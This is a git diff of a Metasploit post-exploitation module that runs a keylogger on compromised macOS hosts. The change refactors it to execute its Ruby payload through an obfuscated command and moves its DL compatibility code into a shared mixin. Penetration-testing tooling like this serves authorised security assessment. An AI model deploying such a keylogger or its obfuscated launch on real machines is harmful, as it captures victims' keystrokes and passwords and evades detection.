@@ -8,6 +8,7 @@ require 'shellwords'
 class Metasploit3 < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
+  include Msf::Post::OSX::RubyDL
 
   # when we need to read from the keylogger,
   # we first "knock" the process by sending a USR1 signal.
@@ -62,11 +63,10 @@ class Metasploit3 < Msf::Post
       :duration => datastore['DURATION'].to_i,
       :port => self.port
     }
-    cmd = ['ruby', '-e', ruby_code(opts)]
 
-    rpid = cmd_exec(cmd.shelljoin, nil, 10)
+    rpid = cmd_exec(obfuscated_ruby_cmd(ruby_code(opts)))
 
-    if rpid =~ /^\d+/
+    if rpid.to_i.present? and not rpid.to_i.zero?
       print_status "Ruby process executing with pid #{rpid.to_i}"
       rpid.to_i
     else
@@ -137,6 +137,8 @@ class Metasploit3 < Msf::Post
       print_status("Cleaning up...")
       kill_process(self.pid)
     end
+
+    super
   end
 
   def ruby_code(opts={})
@@ -144,8 +146,6 @@ class Metasploit3 < Msf::Post
 # Kick off a child process and let parent die
 child_pid = fork do
   require 'thread'
-  require 'dl'
-  require 'dl/import'
 
 
   options = {
@@ -155,38 +155,7 @@ child_pid = fork do
 
 
   #### Patches to DL (for compatibility between 1.8->1.9)
-
-  Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end
-
-  def ruby_1_9_or_higher?
-    RUBY_VERSION.to_f >= 1.9
-  end
-
-  def malloc(size)
-    if ruby_1_9_or_higher?
-      DL::CPtr.malloc(size)
-    else
-      DL::malloc(size)
-    end
-  end
-
-  # the old Ruby Importer defaults methods to downcase every import
-  # This is annoying, so we'll patch with method_missing
-  if not ruby_1_9_or_higher?
-    module DL
-      module Importable
-        def method_missing(meth, *args, &block)
-          str = meth.to_s
-          lower = str[0,1].downcase + str[1..-1]
-          if self.respond_to? lower
-            self.send lower, *args
-          else
-            super
-          end
-        end
-      end
-    end
-  end
+  #{osx_ruby_dl_header}
 
   #### 1-way IPC ####
 
